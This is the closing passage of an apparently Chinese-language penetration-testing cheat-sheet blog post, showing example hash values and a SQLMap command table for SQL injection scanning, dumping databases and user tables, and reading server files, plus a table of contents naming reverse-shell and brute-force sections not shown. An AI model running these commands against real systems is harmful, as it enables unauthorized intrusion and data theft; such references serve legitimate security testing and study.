<td><code>eb368a2dfd38b405f014118c7d9747fcc97f4f0ee75c05963cd9da6ee65ef498:560407001617</code></td>
</tr>
<tr>
<td>SHA-512</td>
<td><code>82a9dda829eb7f8ffe9fbe49e45d47d2dad9664fbb7adf72492e3c81ebd3e29134d9bc12212bf83c6840f10e8246b9db54a4859b7ccd0123d86e5872c1e5082f</code></td>
</tr>
<tr>
<td>SHA-512 $PASS:$SALT</td>
<td><code>e5c3ede3e49fb86592fb03f471c35ba13e8d89b8ab65142c9a8fdafb635fa2223c24e5558fd9313e8995019dcbec1fb584146b7bb12685c7765fc8c0d51379fd</code></td>
</tr>
<tr>
<td>SHA-512 $SALT:$PASS</td>
<td><code>976b451818634a1e2acba682da3fd6efa72adf8a7a08d7939550c244b237c72c7d42367544e826c0c83fe5c02f97c0373b6b1386cc794bf0d21d2df01bb9c08a</code></td>
</tr>
<tr>
<td>NTLM Hash Example</td>
<td><code>b4b9b02e6f09a9bd760f388b67351e2b</code></td>
</tr>
</tbody>
</table>
<h2 id="SQLMap例子"><a href="#SQLMap例子" class="headerlink" title="SQLMap例子"></a>SQLMap例子</h2><p>小型 SQLMap 速查表：</p>
<table>
<thead>
<tr>
<th>命令</th>
<th>解释</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3</code></td>
<td>自动化sqlmap扫描</td>
</tr>
<tr>
<td><code>sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read=&quot;/var/www/blah.php&quot;</code></td>
<td>指定目标的sqlmap scan</td>
</tr>
<tr>
<td><code>sqlmap -u &quot;http://meh.com/meh.php?id=1&quot; --dbms=mysql --tech=U --random-agent --dump</code></td>
<td>使用联合查询技术扫描mysql后端的基于报错的注入 ，使用随机UA，导出数据库</td>
</tr>
<tr>
<td><code>sqlmap -o -u &quot;http://meh.com/form/&quot; --forms</code></td>
<td>检测可能存在注入点表单</td>
</tr>
<tr>
<td><code>sqlmap -o -u &quot;http://meh/vuln-form&quot; --forms  -D database-name -T users --dump</code></td>
<td>导出指定数据库的user表并尝试破解哈希。</td>
</tr>
</tbody>
</table>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/180721MeepwnMaplStory/" rel="next" title="Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含">
                <i class="fa fa-chevron-left"></i> Meepwn2018：MaplStory——以Cookie为跳板的Session文件包含
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/180811-xxe-injection/" rel="prev" title="XML外部实体注入小结">
                XML外部实体注入小结 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  
    <div class="comments" id="comments">
      <div id="disqus_thread">
        <noscript>
          Please enable JavaScript to view the
          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
        </noscript>
      </div>
    </div>

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">findneo</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives">
              
                  <span class="site-state-item-count">74</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            

            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/atom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i></a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
                      
                        <i class="fa fa-fw fa-twitter"></i></a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试工具备忘录"><span class="nav-number">1.</span> <span class="nav-text">渗透测试工具备忘录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#简介"><span class="nav-number">1.1.</span> <span class="nav-text">简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#更新日志："><span class="nav-number">1.1.1.</span> <span class="nav-text">更新日志：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#开始前"><span class="nav-number">1.2.</span> <span class="nav-text">开始前</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#网络配置"><span class="nav-number">1.2.1.</span> <span class="nav-text">网络配置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#设置IP-地址"><span class="nav-number">1.2.1.1.</span> <span class="nav-text">设置IP 地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#子网划分"><span class="nav-number">1.2.1.2.</span> <span class="nav-text">子网划分</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#公开来源情报"><span class="nav-number">1.3.</span> <span class="nav-text">公开来源情报</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#被动信息收集"><span class="nav-number">1.3.1.</span> <span class="nav-text">被动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS"><span class="nav-number">1.3.1.1.</span> <span class="nav-text">DNS</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#WHOIS-枚举"><span class="nav-number">1.3.1.1.1.</span> <span class="nav-text">WHOIS 枚举</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询DNS-IP"><span class="nav-number">1.3.1.1.2.</span> <span class="nav-text">查询DNS IP</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#查询MX记录"><span class="nav-number">1.3.1.1.3.</span> <span class="nav-text">查询MX记录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#用DIG-查询域传送"><span class="nav-number">1.3.1.1.4.</span> <span class="nav-text">用DIG 查询域传送</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DNS-域传送"><span class="nav-number">1.4.</span> <span class="nav-text">DNS 域传送</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#邮件"><span class="nav-number">1.4.1.</span> <span class="nav-text">邮件</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Simply-Email"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">Simply Email</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#半主动信息收集"><span class="nav-number">1.4.2.</span> <span class="nav-text">半主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#基本指纹识别"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">基本指纹识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用NC抓取banner"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">使用NC抓取banner</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#主动信息收集"><span class="nav-number">1.4.3.</span> <span class="nav-text">主动信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DNS-爆破"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">DNS 爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSRecon"><span class="nav-number">1.4.3.1.1.</span> <span class="nav-text">DNSRecon</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口扫描"><span class="nav-number">1.4.3.2.</span> <span class="nav-text">端口扫描</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Nmap命令"><span class="nav-number">1.4.3.2.1.</span> <span class="nav-text">Nmap命令</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#Nmap-UDP扫描"><span class="nav-number">1.4.3.2.1.1.</span> <span class="nav-text">Nmap UDP扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#UDP-协议扫描器"><span class="nav-number">1.4.3.2.1.2.</span> <span class="nav-text">UDP 协议扫描器</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其他主机发现"><span class="nav-number">1.4.3.2.1.3.</span> <span class="nav-text">其他主机发现</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#枚举和攻击网络服务"><span class="nav-number">1.5.</span> <span class="nav-text">枚举和攻击网络服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SAMB-SMB-Windows-域枚举"><span class="nav-number">1.5.1.</span> <span class="nav-text">SAMB / SMB / Windows 域枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Samba枚举"><span class="nav-number">1.5.1.1.</span> <span class="nav-text">Samba枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SMB枚举工具"><span class="nav-number">1.5.1.1.1.</span> <span class="nav-text">SMB枚举工具</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#SMB-版本指纹识别"><span class="nav-number">1.5.1.1.2.</span> <span class="nav-text">SMB 版本指纹识别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#寻找开放的SMB共享"><span class="nav-number">1.5.1.1.3.</span> <span class="nav-text">寻找开放的SMB共享</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#枚举SMB用户"><span class="nav-number">1.5.1.1.4.</span> <span class="nav-text">枚举SMB用户</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#手动测试空会话"><span class="nav-number">1.5.1.1.4.1.</span> <span class="nav-text">手动测试空会话</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#NBTScan-unixwiz"><span class="nav-number">1.5.1.1.4.2.</span> <span class="nav-text">NBTScan unixwiz</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LLMNR-NBT-NS欺骗"><span class="nav-number">1.5.1.2.</span> <span class="nav-text">LLMNR / NBT-NS欺骗</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用Metasploit进行-LLMNR-NetBIOS请求"><span class="nav-number">1.5.1.2.1.</span> <span class="nav-text">使用Metasploit进行 LLMNR / NetBIOS请求</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Responder-py"><span class="nav-number">1.5.1.2.2.</span> <span class="nav-text">Responder.py</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#SNMP枚举工具"><span class="nav-number">1.5.1.3.</span> <span class="nav-text">SNMP枚举工具</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#SNMPv3枚举工具"><span class="nav-number">1.5.1.3.1.</span> <span class="nav-text">SNMPv3枚举工具</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#远程服务枚举"><span class="nav-number">1.5.1.4.</span> <span class="nav-text">远程服务枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#RSH-枚举"><span class="nav-number">1.5.1.4.1.</span> <span class="nav-text">RSH 枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#RSH运行命令"><span class="nav-number">1.5.1.4.1.1.</span> <span class="nav-text">RSH运行命令</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#MetasploitRSH-登陆扫描"><span class="nav-number">1.5.1.4.1.2.</span> <span class="nav-text">MetasploitRSH 登陆扫描</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用rusers显示已登陆用户"><span class="nav-number">1.5.1.4.1.3.</span> <span class="nav-text">使用rusers显示已登陆用户</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#使用rlogin扫描整个子网"><span class="nav-number">1.5.1.4.1.4.</span> <span class="nav-text">使用rlogin扫描整个子网</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#使用finger枚举"><span class="nav-number">1.5.1.5.</span> <span class="nav-text">使用finger枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#利用Solaris的bug显示所有已登录用户"><span class="nav-number">1.5.1.5.1.</span> <span class="nav-text">利用Solaris的bug显示所有已登录用户</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#rwho"><span class="nav-number">1.5.1.6.</span> <span class="nav-text">rwho</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TLS-amp-SSL-测试"><span class="nav-number">1.6.</span> <span class="nav-text">TLS&amp;SSL 测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#testssl-sh"><span class="nav-number">1.6.1.</span> <span class="nav-text">testssl.sh</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞评估"><span class="nav-number">1.7.</span> <span class="nav-text">漏洞评估</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据库渗透测试"><span class="nav-number">1.8.</span> <span class="nav-text">数据库渗透测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Oracle"><span class="nav-number">1.8.1.</span> <span class="nav-text">Oracle</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle-TNS版本指纹识别"><span class="nav-number">1.8.1.1.</span> <span class="nav-text">Oracle TNS版本指纹识别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破Oracle账户"><span class="nav-number">1.8.1.2.</span> <span class="nav-text">爆破Oracle账户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Oracle权限提升"><span class="nav-number">1.8.1.3.</span> <span class="nav-text">Oracle权限提升</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#使用NMAP-NSE脚本验证oracle数据库中的默认账户："><span class="nav-number">1.8.1.3.1.</span> <span class="nav-text">使用NMAP NSE脚本验证oracle数据库中的默认账户：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#确认一个oracle用户的权限级别"><span class="nav-number">1.8.1.3.2.</span> <span class="nav-text">确认一个oracle用户的权限级别</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Oracle权限提升和访问DBA"><span class="nav-number">1.8.1.3.3.</span> <span class="nav-text">Oracle权限提升和访问DBA</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#运行查询语句"><span class="nav-number">1.8.1.3.4.</span> <span class="nav-text">运行查询语句</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#移除利用痕迹："><span class="nav-number">1.8.1.3.5.</span> <span class="nav-text">移除利用痕迹：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#获取Oracle反弹shell："><span class="nav-number">1.8.1.3.6.</span> <span class="nav-text">获取Oracle反弹shell：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MSSQL"><span class="nav-number">1.8.2.</span> <span class="nav-text">MSSQL</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#爆破-MSSQL登陆"><span class="nav-number">1.8.2.1.</span> <span class="nav-text">爆破 MSSQL登陆</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Metasploit-MSSQL-Shell"><span class="nav-number">1.8.2.2.</span> <span class="nav-text">Metasploit MSSQL Shell</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#网络"><span class="nav-number">1.9.</span> <span class="nav-text">网络</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Plink-exe-隧道"><span class="nav-number">1.9.1.</span> <span class="nav-text">Plink.exe 隧道</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#跳板（Pivoting）"><span class="nav-number">1.9.2.</span> <span class="nav-text">跳板（Pivoting）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#SSH-跳板（ssh-Pivoting）"><span class="nav-number">1.9.2.1.</span> <span class="nav-text">SSH 跳板（ssh Pivoting）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Meterpreter-Pivoting"><span class="nav-number">1.9.2.2.</span> <span class="nav-text">Meterpreter Pivoting</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TTL-指纹识别"><span class="nav-number">1.9.3.</span> <span class="nav-text">TTL 指纹识别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IPv4-速查"><span class="nav-number">1.9.4.</span> <span class="nav-text">IPv4 速查</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#各类IP的地址范围"><span class="nav-number">1.9.4.1.</span> <span class="nav-text">各类IP的地址范围</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IPv4私有地址"><span class="nav-number">1.9.4.2.</span> <span class="nav-text">IPv4私有地址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IPv4子网速查表"><span class="nav-number">1.9.4.3.</span> <span class="nav-text">IPv4子网速查表</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VLAN-hopping（跳跃攻击）"><span class="nav-number">1.9.5.</span> <span class="nav-text">VLAN hopping（跳跃攻击）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#VPN测试工具"><span class="nav-number">1.9.6.</span> <span class="nav-text">VPN测试工具</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#IKEForce"><span class="nav-number">1.9.6.1.</span> <span class="nav-text">IKEForce</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#IKE-激进模式-PSK-破解"><span class="nav-number">1.9.6.2.</span> <span class="nav-text">IKE 激进模式 PSK 破解</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-1-验证IKE服务器"><span class="nav-number">1.9.6.2.1.</span> <span class="nav-text">Step 1: 验证IKE服务器</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-2-使用IKEForce枚举组名"><span class="nav-number">1.9.6.2.2.</span> <span class="nav-text">Step 2:使用IKEForce枚举组名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-3-使用ike-scan抓取PSK哈希"><span class="nav-number">1.9.6.2.3.</span> <span class="nav-text">Step 3: 使用ike-scan抓取PSK哈希</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Step-4-使用psk-crack-破解PSK-哈希"><span class="nav-number">1.9.6.2.4.</span> <span class="nav-text">Step 4: 使用psk-crack 破解PSK 哈希</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#PPTP-Hacking"><span class="nav-number">1.9.6.3.</span> <span class="nav-text">PPTP Hacking</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#NMAP-PPTP-指纹识别"><span class="nav-number">1.9.6.3.1.</span> <span class="nav-text">NMAP PPTP 指纹识别:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PPTP字典攻击"><span class="nav-number">1.9.6.3.2.</span> <span class="nav-text">PPTP字典攻击</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNS-隧道"><span class="nav-number">1.9.7.</span> <span class="nav-text">DNS 隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#攻击机器："><span class="nav-number">1.9.7.1.</span> <span class="nav-text">攻击机器：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BOF-Exploit"><span class="nav-number">1.10.</span> <span class="nav-text">BOF / Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit-搜索"><span class="nav-number">1.11.</span> <span class="nav-text">Exploit 搜索</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#搜索EXP"><span class="nav-number">1.11.1.</span> <span class="nav-text">搜索EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在Kali上编译WIndows的exp"><span class="nav-number">1.11.2.</span> <span class="nav-text">在Kali上编译WIndows的exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#交叉编译Exploits"><span class="nav-number">1.11.3.</span> <span class="nav-text">交叉编译Exploits</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用通用漏洞"><span class="nav-number">1.11.4.</span> <span class="nav-text">利用通用漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#利用Shellshock漏洞"><span class="nav-number">1.11.4.1.</span> <span class="nav-text">利用Shellshock漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#cat-file-查看文件内容"><span class="nav-number">1.11.4.1.1.</span> <span class="nav-text">cat file (查看文件内容)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shell-Shock-运行bind-shell"><span class="nav-number">1.11.4.1.2.</span> <span class="nav-text">Shell Shock 运行bind shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Shell-Shock-反弹shell"><span class="nav-number">1.11.4.1.3.</span> <span class="nav-text">Shell Shock 反弹shell</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#简单的本地Web服务器"><span class="nav-number">1.12.</span> <span class="nav-text">简单的本地Web服务器</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#挂载文件共享"><span class="nav-number">1.13.</span> <span class="nav-text">挂载文件共享</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-HTTPS-Web服务枚举"><span class="nav-number">1.14.</span> <span class="nav-text">HTTP / HTTPS Web服务枚举</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#数据包侦测"><span class="nav-number">1.15.</span> <span class="nav-text">数据包侦测</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#用户名枚举"><span class="nav-number">1.16.</span> <span class="nav-text">用户名枚举</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SMB-用户枚举"><span class="nav-number">1.16.1.</span> <span class="nav-text">SMB 用户枚举</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SNMP-用户枚举"><span class="nav-number">1.16.2.</span> <span class="nav-text">SNMP 用户枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码"><span class="nav-number">1.17.</span> <span class="nav-text">密码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#字典"><span class="nav-number">1.17.1.</span> <span class="nav-text">字典</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#爆破服务"><span class="nav-number">1.18.</span> <span class="nav-text">爆破服务</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Hydra-爆破FTP"><span class="nav-number">1.18.1.</span> <span class="nav-text">使用Hydra 爆破FTP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Hydra-爆破POP3"><span class="nav-number">1.18.2.</span> <span class="nav-text">使用Hydra 爆破POP3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用Hydra-爆破SMTP"><span class="nav-number">1.18.3.</span> <span class="nav-text">使用Hydra 爆破SMTP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#密码破解"><span class="nav-number">1.19.</span> <span class="nav-text">密码破解</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#John-The-Ripper-JTR"><span class="nav-number">1.19.1.</span> <span class="nav-text">John The Ripper - JTR</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows-渗透测试命令"><span class="nav-number">1.20.</span> <span class="nav-text">Windows 渗透测试命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Linux-渗透测试命令"><span class="nav-number">1.21.</span> <span class="nav-text">Linux 渗透测试命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#编译EXP"><span class="nav-number">1.22.</span> <span class="nav-text">编译EXP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#判断C代码适用于Windows平台还是Linux"><span class="nav-number">1.22.1.</span> <span class="nav-text">判断C代码适用于Windows平台还是Linux</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用GCC编译Exploit"><span class="nav-number">1.22.2.</span> <span class="nav-text">使用GCC编译Exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在64位的Kali上用GCC编译32位的EXP"><span class="nav-number">1.22.3.</span> <span class="nav-text">在64位的Kali上用GCC编译32位的EXP</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#在-Linux上编译可运行于Windows的exe文件"><span class="nav-number">1.22.4.</span> <span class="nav-text">在 Linux上编译可运行于Windows的exe文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SUID-二进制"><span class="nav-number">1.23.</span> <span class="nav-text">SUID 二进制</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#运行-bin-bash的SUID-C-Shell"><span class="nav-number">1.23.1.</span> <span class="nav-text">运行 /bin/bash的SUID C Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#运行-bin-sh的SUID-C-Shell"><span class="nav-number">1.23.2.</span> <span class="nav-text">运行 /bin/sh的SUID C Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#构建-SUID-Shell-二进制"><span class="nav-number">1.23.3.</span> <span class="nav-text">构建 SUID Shell 二进制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反向Shells"><span class="nav-number">1.24.</span> <span class="nav-text">反向Shells</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TTY-Shells"><span class="nav-number">1.25.</span> <span class="nav-text">TTY Shells</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#用Python模拟-TTY-Shell的技巧"><span class="nav-number">1.25.1.</span> <span class="nav-text">用Python模拟 TTY Shell的技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用sh模拟交互式shell"><span class="nav-number">1.25.2.</span> <span class="nav-text">用sh模拟交互式shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用Perl模拟-TTY-Shell"><span class="nav-number">1.25.3.</span> <span class="nav-text">用Perl模拟 TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用Ruby模拟-TTY-Shell"><span class="nav-number">1.25.4.</span> <span class="nav-text">用Ruby模拟 TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#用Lua-模拟TTY-Shell"><span class="nav-number">1.25.5.</span> <span class="nav-text">用Lua 模拟TTY Shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#从Vi模拟TTY-Shell"><span class="nav-number">1.25.6.</span> <span class="nav-text">从Vi模拟TTY Shell</span></a></li><li class="nav-item nav-level-3"><a 